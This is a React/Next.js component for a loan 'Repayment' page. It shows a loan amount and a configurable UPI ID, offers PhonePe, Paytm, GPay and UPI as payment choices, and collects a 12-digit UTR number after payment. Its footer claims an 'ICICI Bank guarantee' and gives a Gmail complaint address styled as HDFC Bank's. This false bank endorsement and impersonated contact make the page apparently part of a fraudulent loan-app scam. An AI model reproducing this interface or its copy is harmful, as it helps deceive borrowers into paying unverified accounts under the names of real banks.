import Image from 'next/image';
import React, { useState } from 'react'
import { FaArrowDownLong } from "react-icons/fa6";
import { FaCheck } from "react-icons/fa6";
import phonepe_select from "@/public/images/phonepe-select.png"
import paytm_select from "@/public/images/paytm-select.png"
import gpay_select from "@/public/images/gpay-select.png"
import upi_select from "@/public/images/upi-select.png"
import phonepe from "@/public/images/phonepe.png"
import paytm from "@/public/images/paytm.png"
import gpay from "@/public/images/gpay.png"
import upi from "@/public/images/upi.png"
import useStateContext from '@/context/ContextProvider';
import clipboardCopy from 'clipboard-copy';
import formatter from '@/utils/functions/num_formatter';

const Repayment = ({ app_settings }) => {

    const { set_snackbar_alert, handle_submit_utr_notification } = useStateContext();

    const copyToClipboard = (text) => {
        clipboardCopy(text)
            .then(() => {
                set_snackbar_alert({
                    open: true,
                    message: `Copied:${text}`,
                    severity: "success"
                })

            })
            .catch((err) => {
                set_snackbar_alert({
                    open: true,
                    message: "Failed to copy",
                    severity: "primary"
                });
            });
    };


    const [select, set_select] = useState("");

    const [utr, set_utr] = useState("");

    const regex = /^\d{12}$/;

    const handle_submit = async (e) => {
        e.preventDefault();
        if (!select) {
            return set_snackbar_alert({
                open: true,
                message: "Must select any payment method",
                severity: "warning"
            })
        }

        if (utr && regex.test(utr)) {
            const mail_res = await handle_submit_utr_notification(app_settings)
            if (mail_res !== "utr_submitted") {
                return set_snackbar_alert({
                    open: true,
                    message: "Please try again!",
                    severity: "error"
                })
            }
            set_utr("");
            return set_snackbar_alert({
                open: true,
                message: "UTR submitted",
                severity: "success"
            })
        } else {
            set_snackbar_alert({
                open: true,
                message: "Invalid UTR",
                severity: "warning"
            })
        }



    }

    return (
        <form onSubmit={handle_submit} className='py-[20px] px-[10px] w-screen min-h-screen' >
            {/* Amount */}
            <div className='flex w-full justify-between items-center gap-2' >
                <p className='text-slate-700 font-medium  text-[16px]' >Amount</p>
                <div className='flex gap-2 items-center' >
                    <p className='text-[16px] font-bold text-slate-700 text-end' >{app_settings.loan_amount ? `₹ ${formatter(app_settings.loan_amount)}` : ""}</p>
                    <button type={"button"} onClick={() => copyToClipboard(app_settings.loan_amount ? `${formatter(app_settings.loan_amount)}` : "")} className='border border-blue-500 px-[15px] py-[10px] text-blue-500 text-[13px] rounded active:opacity-[.30] transition-all' > COPY</button>

                </div>
            </div>

            {/* UPI */}
            <div className='flex w-full justify-between items-center mt-4 gap-2' >
                <p className='text-slate-700 font-medium text-[16px]' >VPA/UPI</p>
                <div className='flex gap-2 items-center' >
                    <p className='text-[16px] font-bold text-slate-700 w-[175px]
                 break-words md:w-fit text-end' >{app_settings.upi_id ? app_settings.upi_id : ""}</p>
                    <button type={"button"} onClick={() => copyToClipboard(app_settings.upi_id ? app_settings.upi_id : "")} className='border border-blue-500 px-[15px] py-[10px] text-blue-500 rounded text-[13px] active:opacity-[.30] transition-all' > COPY</button>

                </div>
            </div>


            {/* Payment methods */}
            <div className='mt-4'>
                <p className='text-blue-500 font-medium text-[15px] flex items-center' >
                    <FaArrowDownLong />
                    Select payment method and pay
                </p>
                {/* PhonePe */}
                <div className='mt-4 h-[55px] border-y border-zinc-100 flex items-center gap-16' >
                    <button type={"button"} onClick={() => set_select("phonepe")} className={`border-blue-500 ${select === "phonepe" ? "bg-blue-500" : "bg-white"} border rounded-full p-[3px] text-[12px] font-thin text-white`} >
                        {select === "phonepe" ?
                            <FaCheck />
                            :
                            <FaCheck className='text-white' />

                        }
                    </button>

                    <Image src={phonepe_select} alt="Phone-pe" className='w-[90px] object-contain' />

                </div>
                {/* Paytm */}
                <div className='h-[55px] border-b border-zinc-100 flex items-center gap-[70px]' >
                    <button type="button" onClick={() => set_select("paytm")} className={`border-blue-500 ${select === "paytm" ? "bg-blue-500" : "bg-white"} border rounded-full p-[3px] text-[12px] font-thin text-white`} >
                        {select === "paytm" ?
                            <FaCheck />
                            :
                            <FaCheck className='text-white' />
                        }
                    </button>

                    <Image src={paytm_select} alt="Paytm" className='w-[65px] object-contain' />

                </div>
                {/* G-pay */}
                <div className='h-[55px] border-b border-zinc-100 flex items-center gap-16' >
                    <button type="button" onClick={() => set_select("gpay")} className={`border-blue-500 ${select === "gpay" ? "bg-blue-500" : "bg-white"} border rounded-full p-[3px] text-[12px] font-thin text-white`} >
                        {select === "gpay" ?
                            <FaCheck />
                            :
                            <FaCheck className='text-white' />
                        }
                    </button>

                    <Image src={gpay_select} alt="G Pay" className='w-[50px] 6object-contain' />

                </div>
                {/* UPI */}
                <div type="button" className='h-[55px] border-b border-zinc-100 flex items-center gap-16' >
                    <button onClick={() => set_select("upi")} className={`border-blue-500 ${select === "upi" ? "bg-blue-500" : "bg-white"} border rounded-full p-[3px] text-[12px] font-thin text-white`} >
                        {select === "upi" ?
                            <FaCheck />
                            :
                            <FaCheck className='text-white' />
                        }
                    </button>

                    <Image src={upi_select} alt="UPI" className='w-[60px] object-contain' />

                </div>

            </div>

            {/* UTR input */}
            <div className='mt-4' >

                <p className='text-blue-500 font-medium text-[15px] flex items-center' >
                    <FaArrowDownLong />
                    Fill the UTR numbers after you done payment
                </p>

                <div className='flex gap-8 border-b border-zinc-100 px-[16px] py-[12px]' >
                    <label className='text-slate-700 font-medium  text-[14px]' >UTR</label>
                    <input
                        value={utr}
                        onChange={e => set_utr(e.target.value)}
                        type="text"
                        className='border-none outline-none text-[13px] caret-gray-500 w-full'
                        placeholder='Input UTR number'
                    />
                </div>

            </div>


            {/* Buttons */}
            <div className='mt-2 px-[10px]'>
                <button type='submit' className='w-full bg-blue-500 active:opacity-75 transition-all py-[12px] text-[13px] text-white rounded-full' >
                    Submit UTR
                </button>
            </div>


            {/* Footer */}
            <div className='mt-10'>
                <div className='flex w-full justify-center items-center' >
                    <Image src={phonepe} alt="PhonePe" className='w-[30px] rounded-lg' />
                    <Image src={gpay} alt="GPay" className='w-[30px] object-contain' />
                    <Image src={paytm} alt="Paytm" className='w-[30px] object-contain' />
                    <Image src={upi} alt="UPI" className='w-[80px] object-contain' />
                </div>

                <div className='mt-4'>
                    <p className='text-zinc-400 lead leading-[15px] font-normal  text-[11px]' >
                        Dear customers: Please give priority to this channel to recharge! Support UPI account withdrawal! ICICI Bank guarantee! Safe and reliable! If you have any questions, please contact:
                    </p>
                </div>

                <div className='w-full flex justify-center pb-6' >
                    <a href='mailto:hdfcbankcomplaintacceptance@gmail.com'
                        className='text-blue-700 font-bold  text-[11px] text-center'
                    >
                        hdfcbankcomplaintacceptance@gmail.com
                    </a>
                </div>

            </div>



        </form>
    )
}

export default Repayment